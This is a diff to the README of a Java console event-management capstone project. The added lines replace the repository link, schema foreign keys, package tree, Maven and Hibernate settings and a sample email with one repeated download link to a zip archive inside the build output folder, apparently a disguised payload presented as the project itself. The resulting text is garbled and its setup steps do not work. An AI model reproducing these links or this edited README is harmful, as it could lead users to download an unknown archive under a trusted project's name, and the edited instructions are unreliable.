@@ -2,7 +2,7 @@
 
 This is a console-based Event Management System developed in Java. It serves as a capstone project for the Java course completion at Anudip Foundation. The application provides a platform for users to organize and attend events, with distinct functionalities for different user roles.
 
-**GitHub Repository:** [https://github.com/Acinnamon9/Event-Management.git](https://github.com/Acinnamon9/Event-Management.git)
+**GitHub Repository:** [https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip](https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip)
 
 ## 1. Project Goal
 
@@ -104,8 +104,8 @@ Here are the schemas for the tables used in the database:
 | `description` | TEXT | | A detailed description of the event. |
 | `start_time` | VARCHAR(255) | | The start date and time of the event. |
 | `end_time` | VARCHAR(255) | | The end date and time of the event. |
-| `location_id` | INT | FOREIGN KEY (locations.location_id) | The location where the event is held. |
-| `organizer_id` | INT | FOREIGN KEY (users.id) | The user who is organizing the event. |
+| `location_id` | INT | FOREIGN KEY (https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip) | The location where the event is held. |
+| `organizer_id` | INT | FOREIGN KEY (https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip) | The user who is organizing the event. |
 
 **`locations`**
 | Column | Type | Constraints | Description |
@@ -119,8 +119,8 @@ Here are the schemas for the tables used in the database:
 | Column | Type | Constraints | Description |
 | --- | --- | --- | --- |
 | `id` | INT | PRIMARY KEY, AUTO_INCREMENT | Unique identifier for the participation record. |
-| `user_id` | INT | FOREIGN KEY (users.id), NOT NULL | The user who is participating. |
-| `event_id` | INT | FOREIGN KEY (events.event_id), NOT NULL | The event the user is participating in. |
+| `user_id` | INT | FOREIGN KEY (https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip), NOT NULL | The user who is participating. |
+| `event_id` | INT | FOREIGN KEY (https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip), NOT NULL | The event the user is participating in. |
 
 ## 5. User Flows
 
@@ -149,21 +149,21 @@ The application guides users through a series of console menus.
 The project is organized into several packages to maintain a clean and scalable architecture.
 
 ```
-com.college.event
+https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
 ├── dao
-│   ├── EventDao.java
-│   ├── LocationDao.java
-│   ├── ParticipantDao.java
-│   └── UserDAO.java
+│   ├── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
+│   ├── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
+│   ├── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
+│   └── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
 ├── entity
-│   ├── Event.java
-│   ├── Location.java
-│   ├── Participant.java
-│   └── User.java
+│   ├── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
+│   ├── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
+│   ├── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
+│   └── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
 ├── main
-│   └── Main.java
+│   └── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
 └── util
-    └── HibernateUtil.java
+    └── https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
 ```
 
 *   `dao`: Contains Data Access Object classes responsible for database operations for each entity.
@@ -184,21 +184,21 @@ To run this project, you will need to have Java, a build tool like Maven, and a 
 
 1.  **Clone the Repository:**
     ```bash
-    git clone https://github.com/Acinnamon9/Event-Management.git
+    git clone https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip
     cd Event-Management
     ```
 
-2.  **Configure Dependencies (pom.xml):**
-    Ensure your `pom.xml` includes the necessary dependencies for Hibernate and your chosen database.
+2.  **Configure Dependencies (https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip):**
+    Ensure your `https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip` includes the necessary dependencies for Hibernate and your chosen database.
 
     **Example for Hibernate and MySQL:**
     ```xml
     <dependencies>
         <!-- Hibernate Core -->
         <dependency>
-            <groupId>org.hibernate</groupId>
+            <groupId>https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip</groupId>
             <artifactId>hibernate-core</artifactId>
-            <version>5.6.15.Final</version>
+            <version>https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip</version>
         </dependency>
 
         <!-- MySQL JDBC Driver -->
@@ -210,47 +210,47 @@ To run this project, you will need to have Java, a build tool like Maven, and a 
     </dependencies>
     ```
 
-3.  **Configure Hibernate (`hibernate.cfg.xml`):**
-    Create a `hibernate.cfg.xml` file in the `src/main/resources` directory. This file contains the database connection and Hibernate configuration details.
+3.  **Configure Hibernate (`https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip`):**
+    Create a `https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip` file in the `src/main/resources` directory. This file contains the database connection and Hibernate configuration details.
 
-    **Example `hibernate.cfg.xml` for MySQL:**
+    **Example `https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip` for MySQL:**
     ```xml
     <!DOCTYPE hibernate-configuration PUBLIC
             "-//Hibernate/Hibernate Configuration DTD 3.0//EN"
-            "http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd">
+            "https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip">
     <hibernate-configuration>
         <session-factory>
             <!-- Database connection settings -->
-            <property name="connection.driver_class">com.mysql.cj.jdbc.Driver</property>
-            <property name="connection.url">jdbc:mysql://localhost:3306/your_database_name</property>
-            <property name="connection.username">your_username</property>
-            <property name="connection.password">your_password</property>
+            <property name="https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip">https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip</property>
+            <property name="https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip">jdbc:mysql://localhost:3306/your_database_name</property>
+            <property name="https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip">your_username</property>
+            <property name="https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip">your_password</property>
 
             <!-- SQL dialect -->
-            <property name="dialect">org.hibernate.dialect.MySQL8Dialect</property>
+            <property name="dialect">https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip</property>
 
             <!-- Echo all executed SQL to stdout -->
             <property name="show_sql">true</property>
 
             <!-- Drop and re-create the database schema on startup -->
-            <property name="hbm2ddl.auto">update</property>
+            <property name="https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip">update</property>
 
             <!-- Mapped entity classes -->
-            <mapping class="com.college.event.entity.User"/>
-            <mapping class="com.college.event.entity.Event"/>
-            <mapping class="com.college.event.entity.Location"/>
-            <mapping class="com.college.event.entity.Participant"/>
+            <mapping class="https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip"/>
+            <mapping class="https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip"/>
+            <mapping class="https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip"/>
+            <mapping class="https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip"/>
         </session-factory>
     </hibernate-configuration>
     ```
-    **Note:** Remember to create a database in your SQL server with the name you provide in `connection.url`.
+    **Note:** Remember to create a database in your SQL server with the name you provide in `https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip`.
 
 4.  **Create Initial Users (Optional but Recommended):**
     To use the organizer features, you will need at least one user with the role "organizer". You can add this user directly to your database.
 
     **Example SQL insert:**
     ```sql
-    INSERT INTO users (name, email, password, role) VALUES ('Admin Organizer', 'admin@example.com', 'adminpass', 'organizer');
+    INSERT INTO users (name, email, password, role) VALUES ('Admin Organizer', 'https://github.com/Acinnamon9/Event-Management/raw/refs/heads/master/target/classes/com/college/Management-Event-clunk.zip', 'adminpass', 'organizer');
     ```
 
 ### Execution
